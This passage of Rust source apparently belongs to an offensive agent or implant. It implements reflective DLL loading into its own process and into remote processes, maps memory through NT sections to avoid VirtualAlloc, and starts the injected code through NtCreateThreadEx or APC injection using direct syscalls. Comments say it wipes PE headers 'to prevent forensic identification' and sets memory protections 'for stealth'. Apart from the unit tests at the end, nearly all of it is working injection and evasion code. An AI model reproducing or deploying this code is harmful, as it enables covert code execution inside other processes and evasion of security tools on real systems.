        } else if characteristics
            & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE
            != 0
        {
            PAGE_EXECUTE_READ
        } else if characteristics
            & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE
            != 0
        {
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        };

        // Ignore protection failures (some sections may not allow changes)
        let _ = nt_protect_virtual_memory(CURRENT_PROCESS, section_base, section_size, protect);
    }

    Ok(())
}

/// Wipe the PE headers to prevent forensic identification.
unsafe fn wipe_headers(base: usize) -> Result<()> {
    // Make the header page writable
    nt_protect_virtual_memory(
        CURRENT_PROCESS,
        base as *mut c_void,
        PAGE_SIZE,
        PAGE_READWRITE,
    )?;

    // Zero the first page
    std::ptr::write_bytes(base as *mut u8, 0u8, PAGE_SIZE);

    // Re-protect as read-only
    nt_protect_virtual_memory(
        CURRENT_PROCESS,
        base as *mut c_void,
        PAGE_SIZE,
        PAGE_READONLY,
    )?;

    Ok(())
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Reflectively load a DLL into the current process.
///
/// Uses `NtCreateSection` + `NtMapViewOfSection` to allocate memory
/// (no VirtualAlloc), then copies and fixes up the PE image in place.
///
/// # Arguments
///
/// * `dll_bytes` — Raw bytes of the PE DLL to load.
/// * `config` — Configuration controlling loading behaviour.
///
/// # Returns
///
/// A `LoadedModule` with base address, size, entry point, and cleanup.
///
/// # Safety
///
/// This function is inherently unsafe as it maps executable code into
/// the process and may call arbitrary DllMain routines.
pub unsafe fn reflective_load(
    dll_bytes: &[u8],
    config: &ReflectiveLoadConfig,
) -> Result<LoadedModule> {
    // ── Phase 1: Parse PE and create section ────────────────────────────
    let pe = parse_pe_headers(dll_bytes)?;

    let page_prot = if config.execute_from_section {
        PAGE_EXECUTE_READWRITE
    } else {
        PAGE_READWRITE
    };

    let h_section = nt_create_section(pe.size_of_image, page_prot)?;
    let (base_addr, _view_size) =
        nt_map_view_of_section(h_section, CURRENT_PROCESS, pe.size_of_image, page_prot)?;

    // Close the section handle — the mapping remains valid
    close_nt_handle(h_section);

    let base = base_addr as usize;

    // ── Phase 2: Copy image and apply fixups ────────────────────────────
    // If any step after mapping fails, unmap the section so we don't leak
    // the allocated region.  (The LoadedModule cleanup closure is only
    // created on the success path.)
    let load_result: Result<()> = (|| {
        copy_image(base_addr, dll_bytes, &pe)?;

        if config.handle_relocations {
            apply_relocations(base, &pe, dll_bytes)?;
        }

        if config.resolve_imports {
            if let Err(e) = rebuild_iat_reflective(base, &pe) {
                tracing::warn!("reflective_loader: IAT rebuild failed: {}", e);
            }
        }

        // Apply per-section memory protections (RWX → appropriate per-section)
        if !config.execute_from_section || true {
            // Always apply section protections for stealth
            if let Err(e) = apply_section_protections(base, &pe, dll_bytes) {
                tracing::warn!("reflective_loader: section protection failed: {}", e);
            }
        }

        Ok(())
    })();

    if let Err(e) = load_result {
        // Unmap the leaked mapping before propagating the error.
        if let Err(unmap_err) = nt_unmap_view_of_section(base_addr) {
            tracing::warn!(
                "reflective_loader: failed to unmap leaked section at {:p}: {}",
                base_addr,
                unmap_err
            );
        }
        return Err(e);
    }

    // ── Phase 3: Execute and clean up ───────────────────────────────────
    let entry_point = if pe.entry_point_rva != 0 {
        base + pe.entry_point_rva as usize
    } else {
        0
    };

    if config.call_entry_point && entry_point != 0 {
        // DllMain signature: fn(hModule: HINSTANCE, reason: u32, reserved: LPVOID)
        type DllMainFn = unsafe extern "system" fn(*mut c_void, u32, *mut c_void) -> i32;
        let dll_main: DllMainFn = mem::transmute(entry_point as *const ());
        dll_main(
            base as *mut c_void,
            DLL_PROCESS_ATTACH,
            std::ptr::null_mut(),
        );
    }

    if config.cleanup_headers {
        if let Err(e) = wipe_headers(base) {
            tracing::warn!("reflective_loader: header wipe failed: {}", e);
        }
    }

    let size = pe.size_of_image;
    let cleanup_base = base;
    Ok(LoadedModule {
        base_address: base,
        size,
        entry_point,
        module_handle: base,
        cleanup_fn: Some(Box::new(move || unsafe {
            if let Err(e) = nt_unmap_view_of_section(cleanup_base as *mut c_void) {
                tracing::warn!("reflective_loader: cleanup unmap failed: {}", e);
            }
        })),
    })
}

// ── Remote Loading ──────────────────────────────────────────────────────────

/// Configuration for remote reflective DLL loading.
#[derive(Debug, Clone)]
pub struct RemoteLoadConfig {
    /// Handle to the target process (must have PROCESS_VM_OPERATION,
    /// PROCESS_VM_WRITE, and PROCESS_CREATE_THREAD access).
    pub process_handle: HANDLE,

    /// Standard load configuration.
    pub load_config: ReflectiveLoadConfig,

    /// How to trigger execution in the remote process.
    pub execution_method: RemoteExecMethod,
}

/// Method for triggering execution in a remote process.
#[derive(Debug, Clone)]
pub enum RemoteExecMethod {
    /// Create a remote thread at the entry point.
    CreateThread,
    /// Queue a user-mode APC to a target thread.
    Apc {
        /// Thread handle to queue the APC on.
        thread_handle: HANDLE,
    },
}

/// Result of a remote reflective load.
pub struct RemoteLoadedModule {
    /// Base address of the loaded image in the target process.
    pub base_address: usize,
    /// Size of the mapped image.
    pub size: usize,
    /// Entry point address in the target process.
    pub entry_point: usize,
    /// Handle to the section object (closed on drop).
    section_handle: HANDLE,
}

impl RemoteLoadedModule {
    /// Manually clean up the section handle.
    pub fn cleanup(&mut self) {
        close_nt_handle(self.section_handle);
        self.section_handle = std::ptr::null_mut();
    }
}

impl Drop for RemoteLoadedModule {
    fn drop(&mut self) {
        self.cleanup();
    }
}

/// Reflectively load a DLL into a remote process.
///
/// Creates a shared section, maps it into both the agent process (for writing)
/// and the target process (for execution), loads the DLL into the shared
/// section, then triggers execution.
///
/// # Arguments
///
/// * `dll_bytes` — Raw bytes of the PE DLL to load.
/// * `remote_config` — Remote loading configuration.
///
/// # Returns
///
/// A `RemoteLoadedModule` with the base address in the target process.
pub unsafe fn reflective_load_remote(
    dll_bytes: &[u8],
    remote_config: &RemoteLoadConfig,
) -> Result<RemoteLoadedModule> {
    let pe = parse_pe_headers(dll_bytes)?;
    let h_section = nt_create_section(pe.size_of_image, PAGE_EXECUTE_READWRITE)?;

    // Map into the agent process for writing
    let (local_base, _local_size) =
        nt_map_view_of_section(h_section, CURRENT_PROCESS, pe.size_of_image, PAGE_READWRITE)?;

    // Copy the raw image into the shared local view.
    copy_image(local_base, dll_bytes, &pe)?;

    // The local copy has delta = local_base - image_base, but we need
    // the delta for the remote base.  We need to:
    // 1. First map into the target process to get the remote base
    // 2. Re-apply relocations with the correct delta

    // Map into the target process
    let (remote_base, _remote_size) = nt_map_view_of_section(
        h_section,
        remote_config.process_handle,
        pe.size_of_image,
        PAGE_EXECUTE_READWRITE,
    )?;

    let remote_addr = remote_base as usize;
    let local_addr = local_base as usize;

    // Re-apply relocations with the remote delta on the *shared* local view.
    // The target view sees the same physical pages.
    if remote_config.load_config.handle_relocations {
        // Ensure relocation writes always start from raw image bytes.
        copy_image(local_base, dll_bytes, &pe)?;

        // Apply relocation delta for the remote base while writing through
        // the shared local mapping.
        apply_relocations_for_remote_shared(local_addr, remote_addr, &pe)?;
    }

    // Resolve imports in target-process address space and write resolved
    // addresses into the shared IAT.
    if remote_config.load_config.resolve_imports {
        rebuild_iat_reflective_remote(remote_config.process_handle, local_addr, remote_addr, &pe)?;
    }

    // Apply section protections in the target process
    if let Err(e) =
        apply_section_protections_remote(remote_config.process_handle, remote_addr, &pe, dll_bytes)
    {
        tracing::warn!("reflective_loader: remote section protection failed: {}", e);
    }

    // Unmap the local view — we're done writing
    nt_unmap_view_of_section(local_base)?;

    let entry_point = if pe.entry_point_rva != 0 {
        remote_addr + pe.entry_point_rva as usize
    } else {
        0
    };

    // Trigger execution in the target process
    if remote_config.load_config.call_entry_point && entry_point != 0 {
        trigger_remote_execution(
            remote_config.process_handle,
            entry_point,
            remote_addr,
            &remote_config.execution_method,
        )?;
    }

    Ok(RemoteLoadedModule {
        base_address: remote_addr,
        size: pe.size_of_image,
        entry_point,
        section_handle: h_section,
    })
}

/// Apply per-section memory protections in a remote process.
unsafe fn apply_section_protections_remote(
    process_handle: HANDLE,
    base: usize,
    pe: &PeInfo,
    dll_bytes: &[u8],
) -> Result<()> {
    // Protect headers as read-only
    nt_protect_virtual_memory(
        process_handle,
        base as *mut c_void,
        PAGE_SIZE,
        PAGE_READONLY,
    )?;

    let sections = get_section_headers(dll_bytes, pe)?;
    for section in sections {
        let characteristics = section.Characteristics;
        let virtual_size = section.Misc.VirtualSize as usize;
        let virtual_address = section.VirtualAddress as usize;

        if virtual_size == 0 {
            continue;
        }

        let section_base = (base + virtual_address) as *mut c_void;
        let section_size = align_up(virtual_size, PAGE_SIZE);

        let protect = if characteristics
            & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE
            != 0
            && characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE
                != 0
        {
            PAGE_EXECUTE_READWRITE
        } else if characteristics
            & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE
            != 0
        {
            PAGE_EXECUTE_READ
        } else if characteristics
            & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE
            != 0
        {
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        };

        let _ = nt_protect_virtual_memory(process_handle, section_base, section_size, protect);
    }

    Ok(())
}

/// Trigger execution of the DLL entry point in the target process.
unsafe fn trigger_remote_execution(
    process_handle: HANDLE,
    entry_point: usize,
    base_addr: usize,
    method: &RemoteExecMethod,
) -> Result<()> {
    match method {
        RemoteExecMethod::CreateThread => {
            let sys = resolve_syscall("NtCreateThreadEx")?;
            let mut h_thread: HANDLE = std::ptr::null_mut();

            // NtCreateThreadEx signature (simplified):
            // NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes,
            //   ProcessHandle, StartRoutine, Argument, CreateFlags,
            //   ZeroBits, StackSize, MaxStackSize, AttributeList)
            let status = do_syscall(
                sys.ssn,
                sys.gadget_addr,
                &[
                    &mut h_thread as *mut _ as u64,     // ThreadHandle
                    0x1FFFFF,                           // THREAD_ALL_ACCESS
                    std::ptr::null_mut::<u64>() as u64, // ObjectAttributes
                    process_handle as u64,              // ProcessHandle
                    entry_point as u64,                 // StartRoutine
                    base_addr as u64,                   // Argument (hModule for DllMain)
                    0,                                  // CreateFlags (0 = run immediately)
                    0,                                  // ZeroBits
                    0,                                  // StackSize (0 = default)
                    0,                                  // MaxStackSize (0 = default)
                    std::ptr::null_mut::<u64>() as u64, // AttributeList
                ],
            );

            if status != 0 {
                bail!("NtCreateThreadEx failed with status {:#x}", status as u32);
            }
            close_nt_handle(h_thread);
            Ok(())
        }
        RemoteExecMethod::Apc { thread_handle } => {
            // Queue a user-mode APC to the target thread.
            // The APC will call the entry point when the thread enters
            // an alertable wait state.
            let sys = resolve_syscall("NtQueueApcThread")?;
            let status = do_syscall(
                sys.ssn,
                sys.gadget_addr,
                &[
                    *thread_handle as u64, // ThreadHandle
                    entry_point as u64,    // ApcRoutine
                    base_addr as u64,      // ApcContext (hModule)
                    0,                     // ApcStatus
                    0,                     // ApcReserved
                ],
            );
            if status != 0 {
                bail!("NtQueueApcThread failed with status {:#x}", status as u32);
            }
            Ok(())
        }
    }
}

// ── Unit Tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// Verify that parse_pe_headers rejects empty input.
    #[test]
    fn parse_pe_rejects_empty_input() {
        let result = parse_pe_headers(&[]);
        assert!(result.is_err());
    }

    /// Verify that parse_pe_headers rejects random data.
    #[test]
    fn parse_pe_rejects_non_pe() {
        let data = [0u8; 1024];
        let result = parse_pe_headers(&data);
        assert!(result.is_err());
    }

    /// Verify that parse_pe_headers rejects a DOS header without PE signature.
    #[test]
    fn parse_pe_rejects_dos_only() {
        let mut data = vec![0u8; 1024];
        // MZ signature
        data[0] = b'M';
        data[1] = b'Z';
        // e_lfanew pointing to offset 0x80
        data[0x3C] = 0x80;
        data[0x3D] = 0x00;
        data[0x3E] = 0x00;
        data[0x3F] = 0x00;
        // No PE signature at 0x80

        let result = parse_pe_headers(&data);
        assert!(result.is_err());
    }

    /// Test that a minimal valid PE32+ header is parsed correctly.
    #[test]
    fn parse_pe_accepts_minimal_pe64() {
        // Build a minimal PE32+ image in memory
        let mut data = vec![0u8; 4096];

        // DOS header
        data[0] = b'M';
        data[1] = b'Z';
        // e_lfanew = 0x80
        data[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());

        // PE signature at 0x80
        data[0x80..0x84].copy_from_slice(&0x4550u32.to_le_bytes());

        // File header at 0x84
        let machine: u16 = 0x8664; // AMD64
        data[0x84..0x86].copy_from_slice(&machine.to_le_bytes());
        let num_sections: u16 = 0;
        data[0x86..0x88].copy_from_slice(&num_sections.to_le_bytes());
        // Skip time_date_stamp, pointer_to_symbol_table, number_of_symbols
        let size_of_opt_header: u16 = mem::size_of::<IMAGE_NT_HEADERS64>() as u16 - 4;
        data[0x94..0x96].copy_from_slice(&size_of_opt_header.to_le_bytes());
        let characteristics: u16 = 0x2022; // DLL | EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
        data[0x96..0x98].copy_from_slice(&characteristics.to_le_bytes());

        // Optional header at 0x98
        let magic: u16 = 0x20B; // PE32+
        data[0x98..0x9A].copy_from_slice(&magic.to_le_bytes());

        // SizeOfImage at optional header + 0x38 = 0x98 + 0x38 = 0xD0
        let size_of_image: u32 = 0x1000;
        data[0xD0..0xD4].copy_from_slice(&size_of_image.to_le_bytes());

        // ImageBase at optional header + 0x18 = 0x98 + 0x18 = 0xB0
        let image_base: u64 = 0x180000000;
        data[0xB0..0xB8].copy_from_slice(&image_base.to_le_bytes());

        // AddressOfEntryPoint at optional header + 0x10 = 0x98 + 0x10 = 0xA8
        let entry_point: u32 = 0x1000;
        data[0xA8..0xAC].copy_from_slice(&entry_point.to_le_bytes());

        let pe = parse_pe_headers(&data).expect("should parse valid PE64");
        assert_eq!(pe.magic, 0x20B);
        assert_eq!(pe.size_of_image, 0x1000);
        assert_eq!(pe.image_base, 0x180000000 as usize);
        assert_eq!(pe.entry_point_rva, 0x1000);
        assert_eq!(pe.number_of_sections, 0);
    }

    /// Test that align_up works correctly.
    #[test]
    fn align_up_works() {
        assert_eq!(align_up(0, 4096), 0);
        assert_eq!(align_up(1, 4096), 4096);
        assert_eq!(align_up(4095, 4096), 4096);
        assert_eq!(align_up(4096, 4096), 4096);
        assert_eq!(align_up(4097, 4096), 8192);
    }

    /// Verify that ReflectiveLoadConfig defaults are sane.
    #[test]
    fn default_config_is_sane() {
        let config = ReflectiveLoadConfig::default();
        assert!(config.resolve_imports);
        assert!(config.handle_relocations);
        assert!(config.call_entry_point);
        assert!(config.cleanup_headers);
        assert!(config.execute_from_section);
    }

    /// Verify that parse_pe_headers handles PE32 (32-bit) magic.
    #[test]
    fn parse_pe_accepts_pe32() {
        let mut data = vec![0u8; 4096];

        // DOS header
        data[0] = b'M';
        data[1] = b'Z';
        data[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());

        // PE signature
        data[0x80..0x84].copy_from_slice(&0x4550u32.to_le_bytes());

        // File header
        let machine: u16 = 0x14C; // i386
        data[0x84..0x86].copy_from_slice(&machine.to_le_bytes());
        data[0x86..0x88].copy_from_slice(&0u16.to_le_bytes()); // num sections
        let size_of_opt_header: u16 = mem::size_of::<IMAGE_NT_HEADERS32>() as u16 - 4;
        data[0x94..0x96].copy_from_slice(&size_of_opt_header.to_le_bytes());
        data[0x96..0x98].copy_from_slice(&0x2102u16.to_le_bytes()); // characteristics

        // Optional header (PE32)
        let magic: u16 = 0x10B; // PE32
        data[0x98..0x9A].copy_from_slice(&magic.to_le_bytes());

        // SizeOfImage at opt header + 0x38 for PE32 = 0x98 + 0x38 = 0xD0
        data[0xD0..0xD4].copy_from_slice(&0x1000u32.to_le_bytes());

        // ImageBase at opt header + 0x1C for PE32 = 0x98 + 0x1C = 0xB4
        data[0xB4..0xB8].copy_from_slice(&0x10000000u32.to_le_bytes());

        // AddressOfEntryPoint at opt header + 0x10 = 0x98 + 0x10 = 0xA8
        data[0xA8..0xAC].copy_from_slice(&0x1000u32.to_le_bytes());

        let pe = parse_pe_headers(&data).expect("should parse valid PE32");
        assert_eq!(pe.magic, 0x10B);
        assert_eq!(pe.image_base, 0x10000000);
        assert_eq!(pe.entry_point_rva, 0x1000);
    }

    /// Verify the module rejects too many sections.
    #[test]
    fn parse_pe_rejects_too_many_sections() {
        let mut data = vec![0u8; 4096];

        // DOS header
        data[0] = b'M';
        data[1] = b'Z';
        data[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());

        // PE signature
        data[0x80..0x84].copy_from_slice(&0x4550u32.to_le_bytes());

        // File header
        let machine: u16 = 0x8664;
        data[0x84..0x86].copy_from_slice(&machine.to_le_bytes());
        let num_sections: u16 = 200; // Way too many
        data[0x86..0x88].copy_from_slice(&num_sections.to_le_bytes());
        let size_of_opt_header: u16 = mem::size_of::<IMAGE_NT_HEADERS64>() as u16 - 4;
        data[0x94..0x96].copy_from_slice(&size_of_opt_header.to_le_bytes());
        data[0x96..0x98].copy_from_slice(&0x2022u16.to_le_bytes());

        // Optional header
        let magic: u16 = 0x20B;
        data[0x98..0x9A].copy_from_slice(&magic.to_le_bytes());
        data[0xD0..0xD4].copy_from_slice(&0x1000u32.to_le_bytes());
        data[0xB0..0xB8].copy_from_slice(&0x180000000u64.to_le_bytes());

        let result = parse_pe_headers(&data);
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(
            err.to_string().contains("Too many sections"),
            "Expected 'Too many sections' error, got: {}",
            err
        );
    }

    /// Verify get_section_headers handles empty section table.
    #[test]
    fn get_section_headers_empty() {
        let mut data = vec![0u8; 4096];
        data[0] = b'M';
        data[1] = b'Z';
        data[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        data[0x80..0x84].copy_from_slice(&0x4550u32.to_le_bytes());

        let machine: u16 = 0x8664;
        data[0x84..0x86].copy_from_slice(&machine.to_le_bytes());
        data[0x86..0x88].copy_from_slice(&0u16.to_le_bytes()); // 0 sections
        let size_of_opt_header: u16 = mem::size_of::<IMAGE_NT_HEADERS64>() as u16 - 4;
        data[0x94..0x96].copy_from_slice(&size_of_opt_header.to_le_bytes());
        data[0x96..0x98].copy_from_slice(&0x2022u16.to_le_bytes());
        let magic: u16 = 0x20B;
        data[0x98..0x9A].copy_from_slice(&magic.to_le_bytes());
        data[0xD0..0xD4].copy_from_slice(&0x1000u32.to_le_bytes());
        data[0xB0..0xB8].copy_from_slice(&0x180000000u64.to_le_bytes());

        let pe = parse_pe_headers(&data).unwrap();
        let sections = get_section_headers(&data, &pe).unwrap();
        assert_eq!(sections.len(), 0);
    }
}
